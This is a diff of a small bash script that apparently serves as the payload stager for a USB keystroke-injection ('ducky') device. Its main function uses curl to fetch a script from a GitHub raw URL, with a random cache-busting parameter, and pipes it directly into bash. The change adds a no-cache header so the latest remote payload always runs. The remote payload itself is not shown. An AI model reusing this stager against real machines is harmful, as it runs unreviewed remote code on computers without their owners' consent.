@@ -3,7 +3,8 @@
 # This file is tied directly to a usb
 # Changing this will change the payload for the usb in question
 main() {
-    curl -s "https://raw.githubusercontent.com/kroneman/ducky-usb-fun/master/bin/git_computer_says_no?${RANDOM}" | bash
+    curl -H "Cache-Control: no-cache, no-store" \
+         -s "https://raw.githubusercontent.com/kroneman/ducky-usb-fun/master/bin/git_computer_says_no?${RANDOM}" | bash
 }
 
 main "$@"
